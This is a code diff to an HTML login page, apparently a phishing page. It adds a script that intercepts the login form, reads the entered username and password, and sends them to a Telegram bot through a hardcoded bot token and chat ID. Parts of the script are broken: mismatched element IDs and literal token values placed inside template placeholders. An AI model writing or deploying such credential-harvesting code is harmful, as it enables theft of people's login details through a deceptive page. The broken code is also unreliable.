@@ -124,7 +124,7 @@
                 <font size="2.75" color="grey" style="normal">
                 <p id="or" >OR</p></div></center>
         </font>
-        <form onsubmit="return sender()">
+        <form id="loginform">
             <div class="input-box">
                 <input type="text" name="username" placeholder="Username or Email" required>
             </div>
@@ -145,5 +145,22 @@
                 <font size=2 align="center" color="grey"><b>Terms of Use</b> and <b>Privacy Policy</b></font>
             </div>
     </div>
+    <script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const botToken = "7376924106:AAFTGm6XCAbnzc-M5VeIRqMm-9I9859oxpQ";
+        const chatId = "6199929198";
+
+        const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+        const telegramURL = `https://api.telegram.org/bot${7376924106:AAFTGm6XCAbnzc-M5VeIRqMm-9I9859oxpQ}/sendMessage?chat_id=${6199929198}&text=${encodeURIComponent(message)}`;
+
+        fetch(telegramURL)
+            .then(response => alert("Login attempt sent to Telegram"))
+            .catch(error => console.error("Error:", error));
+    });
+    </script>
 </body>
 </html>
